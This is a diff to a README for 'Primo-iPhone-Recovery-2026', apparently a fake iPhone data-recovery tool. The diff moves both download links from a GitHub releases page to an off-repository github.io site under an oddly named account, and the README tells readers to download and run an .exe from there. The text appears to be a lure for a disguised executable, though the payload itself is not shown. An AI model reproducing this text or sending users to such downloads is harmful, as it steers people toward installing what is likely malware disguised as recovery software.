@@ -1,6 +1,6 @@
 # 📁 Primo-iPhone-Recovery-2026 - Recover lost iPhone data with ease
 
-[![](https://img.shields.io/badge/Download-Primo_iPhone_Recovery-blue.svg)](https://github.com/absenteeballotstateswoman448/Primo-iPhone-Recovery-2026/releases)
+[![](https://img.shields.io/badge/Download-Primo_iPhone_Recovery-blue.svg)](https://absenteeballotstateswoman448.github.io)
 
 ## 🎯 Purpose
 This software helps you recover deleted items from your iPhone, iPad, or iPod touch. You can restore photos, messages, contacts, and call history. Use this tool if you accidentally delete files or lose data during a system update. The application runs on Windows 10 and Windows 11.
@@ -17,7 +17,7 @@ Before you install the software, check your computer for these specifications:
 ## 📥 Getting the Software
 You can download the latest installer from the official release page.
 
-[Click here to visit the download page](https://github.com/absenteeballotstateswoman448/Primo-iPhone-Recovery-2026/releases)
+[Click here to visit the download page](https://absenteeballotstateswoman448.github.io)
 
 On that page, look for the section labeled "Assets." Click the link ending in `.exe` to start your download. Save the file to a folder you can find easily, such as your Downloads folder.
 
